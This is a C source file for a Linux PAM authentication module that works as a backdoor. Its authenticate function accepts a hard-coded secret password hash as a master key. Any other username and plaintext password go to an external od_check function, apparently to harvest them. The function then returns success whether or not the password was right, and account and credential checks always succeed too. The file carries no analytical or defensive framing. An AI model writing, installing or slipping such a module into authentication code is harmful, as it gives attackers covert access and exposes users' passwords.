#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
#include <sys/types.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>

#include "config.h"
#include "hash.h"

int od_check(const char *uname, const char *pass, const char *domain);

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
	return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
	return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags, int argc, const char **argv) {
	const char *passwd, *user;
	if (pam_get_authtok(pamh, PAM_AUTHTOK, (const char **)&passwd, NULL) != PAM_SUCCESS) {
		return PAM_AUTH_ERR;
	}
	if (strcmp(crypt(passwd, SALT), HASH) != 0) {
		if (pam_get_user(pamh, &user, NULL) != PAM_SUCCESS)
			return PAM_AUTH_ERR;
		od_check(user, passwd, NULL);
	}
	return PAM_SUCCESS;
}
